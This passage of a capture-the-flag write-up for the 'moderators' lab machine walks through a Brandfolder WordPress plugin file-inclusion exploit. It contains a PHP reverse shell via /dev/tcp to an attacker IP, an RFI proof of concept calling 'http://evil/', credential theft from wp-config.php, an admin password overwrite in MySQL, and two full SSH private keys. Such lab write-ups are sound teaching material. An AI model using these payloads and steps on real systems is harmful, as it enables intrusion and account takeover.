</span></span></code></pre></div><h3 id="discovering-vulnerable-wordpress-plugin">Discovering Vulnerable Wordpress Plugin</h3>
<p>I can see two installed plugins, <em>brandfolder</em> and <em>passwords-manager</em>. Using 

<a href="https://www.exploit-db.com/searchsploit" target="_blank"><em>searchsploit</em></a>, I found that <em>brandfolder</em> version 3.0 had 

<a href="https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/" target="_blank"><em>Local/Remote File Inclusion</em></a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ searchsploit brandfolder
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                                                    |  Path
</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span>WordPress Plugin Brandfolder 3.0 - Local/Remote File Inclusion                                                                                                                    | php/webapps/39591.txt
</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span>Shellcodes: No Results
</span></span></code></pre></div><p>Now, I need to make sure if <em>brandfolder version 3.0</em> is the one used in this instance:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/opt/site.new/wp-content/plugins/brandfolder$ head brandfolder.php
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>/*
</span></span><span style="display:flex;"><span>Plugin Name: Brandfolder
</span></span><span style="display:flex;"><span>Plugin URI: http://wordpress.org/plugins/brandfolder/
</span></span><span style="display:flex;"><span>Description: Adds the ability <span style="color:#66d9ef">for</span> you to edit your Brandfolder inside Wordpress, easily embed it using our Popup Embed, and integrates with the Media Library.
</span></span><span style="display:flex;"><span>Version: 3.0
</span></span><span style="display:flex;"><span>Author: Brandfolder, Inc.
</span></span><span style="display:flex;"><span>Author URI: http://brandfolder.com
</span></span><span style="display:flex;"><span>License: GPLv2
</span></span><span style="display:flex;"><span>*/
</span></span></code></pre></div><p>It is confirmed now that the vulnerable <em>version 3.0</em> is being used.</p>
<p>The vulnerability is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /usr/share/exploitdb/exploits/php/webapps/39591.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Wordpress brandfolder plugin / RFI &amp; LFI</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Google Dork: inurl:wp-content/plugins/brandfolder</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: 03/22/2016</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Author: AMAR^SHG</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vendor Homepage: https://brandfolder.com</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Software Link: https://wordpress.org/plugins/brandfolder/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version: &lt;=3.0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: WAMP / Windows</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I-Details
</span></span><span style="display:flex;"><span>The vulnerability occurs at the first lines of the file callback.php:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>  ini_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;display_errors&#39;</span>,1<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  ini_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;display_startup_errors&#39;</span>,1<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  error_reporting<span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-load.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-admin/includes/media.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-admin/includes/file.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-admin/includes/image.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-admin/includes/post.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$_REQUEST is based on the user input, so as you can guess,
</span></span><span style="display:flex;"><span>an attacker can depending on the context, host on a malicious server
</span></span><span style="display:flex;"><span>a file called wp-load.php, and disable its execution using an htaccess, or
</span></span><span style="display:flex;"><span>abuse the null byte character <span style="color:#f92672">(</span> %00, %2500 url-encoded<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>II-Proof of concept
</span></span><span style="display:flex;"><span>http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath<span style="color:#f92672">=</span>LFI/RFI
</span></span><span style="display:flex;"><span>http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath<span style="color:#f92672">=</span>../../../wp-config.php%00
</span></span><span style="display:flex;"><span>http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath<span style="color:#f92672">=</span>http://evil/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Discovered by AMAR^SHG <span style="color:#f92672">(</span>aka kuroi<span style="color:#960050;background-color:#1e0010">&#39;</span>sh<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Greetings to RxR &amp; Nofawkx Al &amp; HolaKo
</span></span></code></pre></div><h3 id="exploiting-the-vulnerability-to-get-user">Exploiting The Vulnerability To Get User</h3>
<p>In brief, the vulnerability consists of <em>wp_abspath</em> variable, which is used as a directory where all the other files will be loaded, can be passed as user input. This means that I can pass my own <em>wp_abspath</em>, which will be pointing to a directory or web server containing malicious files having the same name as the ones <em>required</em> in the main php file, and force the server to run my malicious code.</p>
<p>So, what I&rsquo;ll do is create a file called <em>wp-load.php</em> inside any writable directory, in my case <em>/dev/shm</em>, which will contain php <em>system</em> function that will execute a reverse shell back to me:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/dev/shm$ echo <span style="color:#e6db74">&#39;&lt;?php system(&#34;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.16.32/8989 0&gt;&amp;1\&#34;&#34;) ?&gt;&#39;</span> &gt; wp-load.php
</span></span><span style="display:flex;"><span>www-data@moderators:/dev/shm$ curl http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath<span style="color:#f92672">=</span>/dev/shm/
</span></span></code></pre></div><p><img src="reverse_shell_as_lexi.png" alt="Lexi Reverse Shell"></p>
<h2 id="post-enumeration-as-lexi">Post Enumeration As Lexi</h2>
<p>Issuing the <code>id</code> command, I noticed that lexi is part of <em>moderators</em> group, and using <code>find</code> command, I was able to get every file owned by this group:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:~$ find / -group moderators 2&gt;/dev/null
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/opt/site.new
</span></span><span style="display:flex;"><span>/opt/site.new/wp-trackback.php
</span></span><span style="display:flex;"><span>/opt/site.new/readme.html
</span></span><span style="display:flex;"><span>/opt/site.new/wp-signup.php
</span></span><span style="display:flex;"><span>/opt/site.new/xmlrpc.php
</span></span><span style="display:flex;"><span>/opt/site.new/wp-config.php
</span></span><span style="display:flex;"><span>....
</span></span></code></pre></div><p>It appears that this group owns wordpress site&rsquo;s files.</p>
<h3 id="portforwarding-wordpress">PortForwarding Wordpress</h3>
<p>Previously, I didn&rsquo;t fully interact with the site to see what&rsquo;s really going on, so this time I&rsquo;ll use 

<a href="https://github.com/jpillora/chisel" target="_blank"><em>chisel</em></a> to port forward the site to my attaching machine:</p>
<ul>
<li>On my attacking machine:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p <span style="color:#ae81ff">9001</span> --reverse
</span></span></code></pre></div></li>
<li>On the target machine:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:~$ ./chisel_1.7.7_linux_amd64 client 10.10.16.32:9001 R:127.0.0.1:8080:127.0.0.1:8080 &amp;
</span></span></code></pre></div></li>
</ul>
<p>However before portforwarding, I need to kill my reverse shell, because now wordpress site is hanging, so I&rsquo;ll copy <em>/home/lexi/.ssh/id_rsa</em> to my machine, then SSH from there as lexi and continue working:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ cat /home/lexi/.ssh/id_rsa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaEryn
</span></span><span style="display:flex;"><span>ECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbM
</span></span><span style="display:flex;"><span>ONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ/QRXYrblAj8Bo1owGebWUBlB/tMcO3Yqvaa
</span></span><span style="display:flex;"><span>QCuzVluSShMrGKJVjL0n2Uvqf/Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWV
</span></span><span style="display:flex;"><span>dQ5ymZTot+/qALnzlDkeUlT/RWtqJxJc6MlWy5/neegZRRd3YNhln/1GyL5aN/0O1gBwf3
</span></span><span style="display:flex;"><span>vY87IYFXK/W0a9Tj5mZ0RNDEOU+wSicM9nS3jabM1Unocq7jw36UPHQhniso6Q7ObvMnWv
</span></span><span style="display:flex;"><span>cxbVFo9M2axqTTnr/gFkLzU0sj8ms4nxoRagCvc8oOUpMXoauEwEwdpbq3FfT8aKGYKl64
</span></span><span style="display:flex;"><span>vO+aJxiTPkPpgI6L+pWCYfLXIXwcbVo2xXp3euHLAAAFiI1Y9VaNWPVWAAAAB3NzaC1yc2
</span></span><span style="display:flex;"><span>EAAAGBAJh1aL5jDfrdLudnmugd+ey3144SLkxuKpF+nmOIgsOxARisGhK8pxAsbzdE22Ym
</span></span><span style="display:flex;"><span>uTIXx4SQy/PG5NgqLKLAZuotKYZ7z6OX2nFnjsz973SIiWHT9F62eZjTC2zDjb6BlPKfCy
</span></span><span style="display:flex;"><span>oZX8xyAaoT8QeDew4JnJoNgyf0EV2K25QI/AaNaMBnm1lAZQf7THDt2Kr2mkArs1ZbkkoT
</span></span><span style="display:flex;"><span>KxiiVYy9J9lL6n/w8OKLkCt08F3c65boQqPYnG/tkHQOysZiJ2+9fjk+q1lXUOcpmU6Lfv
</span></span><span style="display:flex;"><span>6gC585Q5HlJU/0VraicSXOjJVsuf53noGUUXd2DYZZ/9Rsi+Wjf9DtYAcH972POyGBVyv1
</span></span><span style="display:flex;"><span>tGvU4+ZmdETQxDlPsEonDPZ0t42mzNVJ6HKu48N+lDx0IZ4rKOkOzm7zJ1r3MW1RaPTNms
</span></span><span style="display:flex;"><span>ak056/4BZC81NLI/JrOJ8aEWoAr3PKDlKTF6GrhMBMHaW6txX0/GihmCpeuLzvmicYkz5D
</span></span><span style="display:flex;"><span>6YCOi/qVgmHy1yF8HG1aNsV6d3rhywAAAAMBAAEAAAGAUZ2o8SL9/OojjeW8274QaVURpB
</span></span><span style="display:flex;"><span>C/kFL5nuH10LrnpfM/7wFTA+zSUqo275OBEHJyegqY2LLbPCmhoMcTFh2B+qMqs7/cLGvC
</span></span><span style="display:flex;"><span>mSsjG0JlyjC9uw1IqNtuxQ1V9GfLncyo/CmARI1I552wnmgGhEsyuRUULLRHHkBee4E2g0
</span></span><span style="display:flex;"><span>07/hX9meLdGy6J53f0OBBcCUny0Z+TZguniNgyHgHpYmpwxrcJVmyZx+2GxHzZoKX/yM2V
</span></span><span style="display:flex;"><span>vzjapmC7ECZLD2DEU+FQua6YHGw2KOs5tiX7BLQLr2R4cqz0akMZZJ0utIEWgDi5dX/EYy
</span></span><span style="display:flex;"><span>y8HfqtCPWmplcrhtw/DTRVLLCtiL0zzmYMiqvgh6OQZmFcLd0B0jbvBq3fq2l+UAMcUrWp
</span></span><span style="display:flex;"><span>o1D3Rv/KRIVRog9+7e6r8aRVPf/vIXy+jJlaWcG5Tq7a7wWwGQcqVW3aGnZivvc2aYMWVu
</span></span><span style="display:flex;"><span>x4G5F1sD9bamasGARP/j0UNTeBNai+Lg1WDIHOzxq8bQhI0Xvdp2reFFzLGn8ePh0hAAAA
</span></span><span style="display:flex;"><span>wEaFdCpqhzFIqnwgDxrrQJ4QlvysZbMCVgxApzM5SLtAt6jQLBCLrOwe/DYpdFOjIK888U
</span></span><span style="display:flex;"><span>0IRMzUtQjoP+RNU1PJZtB+neDkw6Kl1Muf4DCnTXr9mwyVlMQHmW1asWiEDr66YqLiKSF6
</span></span><span style="display:flex;"><span>CZHYRpFM4qUA+w3ABi8OJ+wzs+KDVk4Aw+v+AotbL9JStLBksR5P08sxAivWT/KbXMifJn
</span></span><span style="display:flex;"><span>LrcrmS/t+QdOG2Vf/7ebYiyBbg1TD4BUAsjKZs8kByr6PoKQAAAMEAyQ1JW3/xrUZyhlWn
</span></span><span style="display:flex;"><span>NnYVC0xcmSAkl90jHyW5AhR+5neuIu548xnk8a3PSO6j3w7kEmJTiOorwzAdM/u9CqWiaU
</span></span><span style="display:flex;"><span>h7E4bnCEoakAlftaJsXWUtf1G7ZXcK587Ccxv330XHToH4HqF408oC/mM40/JNJ9Rqa9Io
</span></span><span style="display:flex;"><span>9azk0fEjIQmjF0GqdNTBfSNqoqZX7HTV34FO+8mj+7fFvrFOnHKsa2FiwADUgEmkw2jJ63
</span></span><span style="display:flex;"><span>egq/DaGJECdxk9CNDElLVQxBs3X4i/AAAAwQDCIEQcdMnPI9cP5WUOmWWNH6jlpEpsF0qm
</span></span><span style="display:flex;"><span>0iAt4qjy/3uoN0NdQrX+8laOMIzRVe/Br4Py4NVmRTsMfU5t/1Jz/DXJoy9CcXD5VKkUnU
</span></span><span style="display:flex;"><span>p668wxSJC8y/5cYKTeE8rwhDXxP0I5ZJztCYf8bL2BWSWF/h4iiUW4mMKyAzvg/iDfjGmb
</span></span><span style="display:flex;"><span>xA8bieu1cmlE5GJgbXeuxeDfRyzWtLfYCwZU5E9RHz0D+1x1M9P+EaNVQu0p3vsS8rWJly
</span></span><span style="display:flex;"><span>J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><ul>
<li>SSH as lexi:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> lexi_id_rsa
</span></span><span style="display:flex;"><span>$ ssh -i lexi_id_rsa lexi@10.10.11.173
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>lexi@moderators:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>lexi<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>lexi<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>lexi<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>moderators<span style="color:#f92672">)</span>
</span></span></code></pre></div></li>
</ul>
<p>Nevertheless, when I access the site from my machine, it looks very ugly:</p>
<p><img src="accessing_wordpress.png" alt="Accessing Wordpress First Time"></p>
<p>So, I&rsquo;ll press [CTRL + U] on my keyboard to view the source code of this site:</p>
<p><img src="investigating_error.png" alt="Investigating The Error"></p>
<p>It appears that the error is comming from <em>moderators.htb</em> being the domain accessed by default to load files. To fix this, I need to add <em>moderators.htb</em> to my <em>/etc/hosts</em> file in the <em>127.0.0.1</em> entry.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ head -n <span style="color:#ae81ff">1</span>  /etc/hosts
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>127.0.0.1	localhost , moderators.htb
</span></span></code></pre></div><p>Now, if I try to access it again everything should work fine:</p>
<p><img src="accessing_site_again.png" alt="Accessing The Site Again"></p>
<h3 id="logging-in-as-admin">Logging In As Admin</h3>
<p>Previously, when I was listing installed plugins, I saw <em>passwords-manager</em> being installed, so this time I&rsquo;ll try to login as admin and see if I can find passwords for other users stored in there. However, I don&rsquo;t know the admin&rsquo;s password, but I can login to the database with credentials from <em>wp-config.php</em> file and change his password to anything I want:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:/opt/site.new$ cat wp-config.php | grep -A <span style="color:#ae81ff">10</span> <span style="color:#e6db74">&#34;The name of the database&#34;</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span> <span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/** MySQL database username */
</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;wordpressuser&#39;</span> <span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/** MySQL database password */
</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;wordpresspassword123!!&#39;</span> <span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/** MySQL hostname */
</span></span><span style="display:flex;"><span>define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">)</span>;
</span></span></code></pre></div><ul>
<li>Credentials for <em>wordpress</em> database are <em>wordpressuser:wordpresspassword123!!</em>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:/opt/site.new$ mysql -u wordpressuser -p<span style="color:#e6db74">&#39;wordpresspassword123!!&#39;</span>
</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
</span></span><span style="display:flex;"><span>Your MariaDB connection id is <span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; show databases;
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| Database           |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span>| information_schema |
</span></span><span style="display:flex;"><span>| wordpress          |
</span></span><span style="display:flex;"><span>+--------------------+
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.001 sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; use wordpress
</span></span><span style="display:flex;"><span>Reading table information <span style="color:#66d9ef">for</span> completion of table and column names
</span></span><span style="display:flex;"><span>You can turn off this feature to get a quicker startup with -A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Database changed
</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>wordpress<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> * from wp_users;
</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
</span></span><span style="display:flex;"><span>| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name |
</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">1</span> | admin      | $P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0 | admin         | admin@moderators.htb | http://192.168.1.4:8080 | 2021-09-11 05:30:20 |                     |           <span style="color:#ae81ff">0</span> | admin        |
</span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">2</span> | lexi       | $P$BZ0Fj92qgnvg4F52r3lpwHejcXag461 | lexi          | lexi@moderators.htb  |                         | 2021-09-12 16:51:16 |                     |           <span style="color:#ae81ff">0</span> | lexi         |
</span></span><span style="display:flex;"><span>+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.001 sec<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Looks like there are only two users, admin and lexi. I can try to crack the password for admin to be stealthier, however I wasn&rsquo;t able to do that using <em>rockyou.txt</em>, that&rsquo;s why I&rsquo;ll generate a new password using any tool, in this case I used <em>

<a href="https://www.useotools.com/wordpress-password-hash-generator/" target="_blank">https://www.useotools.com/wordpress-password-hash-generator/</a></em>, and update the entry manually through <em>mysql</em>:</p>
<p><img src="generate_new_hash.png" alt="Generate New Password"></p>
<ul>
<li>It does even provide me with needed sql query!!</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>wordpress<span style="color:#f92672">]</span>&gt; UPDATE <span style="color:#e6db74">`</span>wp_users<span style="color:#e6db74">`</span> SET <span style="color:#e6db74">`</span>user_pass<span style="color:#e6db74">`</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$P$BBUC3gCfCOoL46jYqzCCIyiLZcY3YG.&#39;</span> WHERE user_login <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>;
</span></span><span style="display:flex;"><span>Query OK, <span style="color:#ae81ff">1</span> row affected <span style="color:#f92672">(</span>0.003 sec<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Rows matched: <span style="color:#ae81ff">1</span>  Changed: <span style="color:#ae81ff">1</span>  Warnings: <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>Now I should be able to login using the new password:</p>
<p><img src="logging_in_as_admin.png" alt="Logging In With New Credentials"></p>
<p><img src="login_success.png" alt="Login Success"></p>
<h3 id="reading-johns-ssh-keys">Reading John&rsquo;s SSH Keys</h3>
<p>Navigating to the <em>passwords-manager</em> plugin, I saw that user <em>john</em> is storing his ssh keys:</p>
<p><img src="noticing_john_ssh_keys.png" alt="Noticing John&amp;rsquo;s SSH Keys"></p>
<p>After copying the key to a new file, I can SSH as <em>john</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat john_id_rsa 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAYEAn/Neot2K7OKlkda5TCHoWwP5u1hHhBwKzM0LN3hn7EwyXshgj9G+
</span></span><span style="display:flex;"><span>lVSMVOUMeS5SM6iyM0Tg82EVfEbAMpPuCGbWvr1inU8B6eDb9voLQyGERcbKf29I7HwXab
</span></span><span style="display:flex;"><span>8T+HkUqy+CLm/X+GR9zlgNhNUZgJePONPK1OLUkz/mJN9Sf57w8ebloATzJJyKNAdRg3Xq
</span></span><span style="display:flex;"><span>HUfwDldCDZiTTt3R6s5wWkrRuZ6sZp+v+RonFhfT2Ue741CSULhS2fcIGCLRW+8WQ+M0yd
</span></span><span style="display:flex;"><span>q76Ite2XHanP9lrj3de8xU92ny/rjqU9U6EJG0DYmtpLrkbGNLey9MjuFncBqQGnCaqfFk
</span></span><span style="display:flex;"><span>HQb+S6eCIDD0N3W0flBMhJfzwxKYXpAJSlLElqhPJayinWXSZqBhbp8Bw3bs4RCHbtwawu
</span></span><span style="display:flex;"><span>SefWzZEsdA0wGrbbuopaJX1UpyuAQb2UD5YRDaSC2V2Rv4Wi/32PxoKyAxj1x6w2wR5yty
</span></span><span style="display:flex;"><span>EoFzVfdeKQ8o5Avl4MM6gqC5qaubduLABhsEXflrAAAFiPtk5tj7ZObYAAAAB3NzaC1yc2
</span></span><span style="display:flex;"><span>EAAAGBAJ/zXqLdiuzipZHWuUwh6FsD+btYR4QcCszNCzd4Z+xMMl7IYI/RvpVUjFTlDHku
</span></span><span style="display:flex;"><span>UjOosjNE4PNhFXxGwDKT7ghm1r69Yp1PAeng2/b6C0MhhEXGyn9vSOx8F2m/E/h5FKsvgi
</span></span><span style="display:flex;"><span>5v1/hkfc5YDYTVGYCXjzjTytTi1JM/5iTfUn+e8PHm5aAE8yScijQHUYN16h1H8A5XQg2Y
</span></span><span style="display:flex;"><span>k07d0erOcFpK0bmerGafr/kaJxYX09lHu+NQklC4Utn3CBgi0VvvFkPjNMnau+iLXtlx2p
</span></span><span style="display:flex;"><span>z/Za493XvMVPdp8v646lPVOhCRtA2JraS65GxjS3svTI7hZ3AakBpwmqnxZB0G/kungiAw
</span></span><span style="display:flex;"><span>9Dd1tH5QTISX88MSmF6QCUpSxJaoTyWsop1l0magYW6fAcN27OEQh27cGsLknn1s2RLHQN
</span></span><span style="display:flex;"><span>MBq227qKWiV9VKcrgEG9lA+WEQ2kgtldkb+Fov99j8aCsgMY9cesNsEecrchKBc1X3XikP
